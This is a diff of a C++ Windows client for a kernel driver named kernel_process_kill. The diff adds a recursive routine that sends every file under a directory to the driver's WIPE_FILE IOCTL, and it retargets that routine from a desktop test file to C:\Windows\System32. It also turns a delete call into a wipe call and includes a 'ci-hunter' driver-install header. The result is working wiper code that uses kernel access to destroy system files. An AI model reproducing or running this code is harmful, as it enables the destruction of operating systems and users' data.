@@ -1,21 +1,22 @@
-#include <iostream>
+#include <afx.h>
 #include <Windows.h>
+#include <iostream>
 #include <winioctl.h>
 #include <tchar.h>
 #include <tlhelp32.h>
-#include "..\kernel_process_kill\ioctls.h"
 #include "resource.h"
+#include "..\kernel_process_kill\ioctls.h"
 
 extern "C"
 {
-#include "main.h"
-#include "ci-hunter\instdrv.h"
+	#include "main.h"
+	#include "ci-hunter\instdrv.h"
 }
 
 using namespace std;
 
-#define DEL_FILE_PATH L"\\??\\C:\\Users\\weixingyu\\Desktop\\123.txt"
-// #define DEL_FILE_PATH L"\\??\\C:\\Windows\\System32\\kernel32.dll"
+// #define DEL_FILE_PATH _T("\\??\\C:\\Users\\weixingyu\\Desktop\\123.txt")
+#define DEL_FILE_PATH _T("C:\\Windows\\System32")
 
 BOOL ResourcesToFile(LPCTSTR lpType, LPCTSTR lpName, LPCTSTR lpFileName, LPCSTR lpSign)
 {
@@ -41,14 +42,49 @@ BOOL ResourcesToFile(LPCTSTR lpType, LPCTSTR lpName, LPCTSTR lpFileName, LPCSTR 
 	return TRUE;
 }
 
+void DeletFile(LPCTSTR strPath, HANDLE hDevice) {
+	CFileFind finder;
+	CString sPath(strPath);
+	sPath += _T("\\*.*");
+	BOOL bWorking = finder.FindFile(sPath);
+	UCHAR OutputBuffer[30];
+	while (bWorking)
+	{
+		ZeroMemory(OutputBuffer, 30);
+		DWORD dwOutput;
+		bWorking = finder.FindNextFile();
+
+		// 跳过 . 和 .. 
+		if (finder.IsDots())
+			continue;
+
+		if (finder.IsDirectory())
+		{
+			CString str = finder.GetFilePath();
+			DeletFile(str, hDevice);
+			RemoveDirectory(str);
+		}
+		else
+		{
+			printf("delete file %ws\r\n", finder.GetFilePath());
+			CString str = _T("\\??\\") + finder.GetFilePath();
+			DeviceIoControl(hDevice, WIPE_FILE, str.GetBuffer(), (wcslen(str.GetBuffer()) + 1) * sizeof(wchar_t), OutputBuffer, 20, &dwOutput, NULL);
+			if (dwOutput)
+				printf("wipe result from kernel %ws\r\n", (wchar_t*)OutputBuffer);
+		}
+	}
+	finder.Close();
+}
+
 int main() {
+	/*
 	// 释放驱动
 	TCHAR FilePath[MAX_PATH] = { _T("0") };
 	GetSystemDirectory(FilePath, MAX_PATH);
 	_tcscat_s(FilePath, MAX_PATH, TEXT("\\drivers\\kernel_process_kill.sys"));
 
 #ifdef _WIN64
-	if (!ResourcesToFile(TEXT("PE"), MAKEINTRESOURCE(IDR_PE2), FilePath, NULL))
+	if (!ResourcesToFile(TEXT("PE"), MAKEINTRESOURCE(IDR_PE1), FilePath, NULL))
 #else
 	if (!ResourcesToFile(TEXT("PE"), MAKEINTRESOURCE(IDR_PE1), FilePath, NULL))
 #endif
@@ -92,15 +128,14 @@ int main() {
 		system("pause");
 		return 0;
 	}
-#endif
-	/*
+#endif*/
 	HANDLE hDevice = CreateFile(_T("\\\\.\\ProcessTerminateDevice"),
 		GENERIC_READ | GENERIC_WRITE,
 		0,
 		NULL,
 		OPEN_EXISTING,
 		FILE_ATTRIBUTE_NORMAL,
-		NULL);*/
+		NULL);
 	if (hDevice == INVALID_HANDLE_VALUE)
 	{
 		printf("open device error with code: %d\n", GetLastError());
@@ -120,16 +155,7 @@ int main() {
 		{
 		case 1:
 		{
-			// wipe specific file
-			wchar_t file_path[MAX_PATH]{ 0 };
-			// printf("input file path u want to delete\r\n");
-			// scanf_s("%ws", file_path);
-			wcscpy_s(file_path, DEL_FILE_PATH);
-			UCHAR OutputBuffer[20];
-			DWORD dwOutput;
-			DeviceIoControl(hDevice, WIPE_FILE, file_path, (wcslen(file_path) + 1) * sizeof(wchar_t), OutputBuffer, 20, &dwOutput, NULL);
-			if (dwOutput)
-				printf("wipe result from kernel %ws\r\n", (wchar_t*)OutputBuffer);
+			DeletFile(DEL_FILE_PATH, hDevice);
 			break;
 		}
 		case 2:
@@ -182,7 +208,7 @@ int main() {
 				wcscpy_s(file_path, DEL_FILE_PATH);
 				UCHAR OutputBuffer[20];
 				DWORD dwOutput;
-				DeviceIoControl(hDevice, DELETE_FILE, file_path, (wcslen(file_path) + 1) * sizeof(wchar_t), OutputBuffer, 20, &dwOutput, NULL);
+				DeviceIoControl(hDevice, WIPE_FILE, file_path, (wcslen(file_path) + 1) * sizeof(wchar_t), OutputBuffer, 20, &dwOutput, NULL);
 				if (dwOutput)
 					printf("delete result from kernel %ws\r\n", (wchar_t*)OutputBuffer);
 			}
